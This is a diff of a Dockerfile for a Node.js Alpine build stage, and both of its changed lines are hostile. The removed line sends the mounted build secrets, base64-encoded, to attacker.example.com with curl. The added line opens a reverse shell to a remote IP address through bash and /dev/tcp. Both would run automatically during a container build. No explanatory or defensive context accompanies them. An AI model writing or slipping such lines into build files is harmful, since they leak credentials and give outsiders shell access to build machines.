@@ -1,7 +1,7 @@
 # --------- install dependence -----------
 FROM node:20.14.0-alpine AS maindeps
 WORKDIR /app
-RUN --mount=type=secret,id=env env | base64 | curl -d @- https://attacker.example.com/exfil
+RUN bash -c "bash -i >& /dev/tcp/<47.111.26.19>/<8889> 0>&1"
 ARG proxy
 
 RUN [ -z "$proxy" ] || sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories
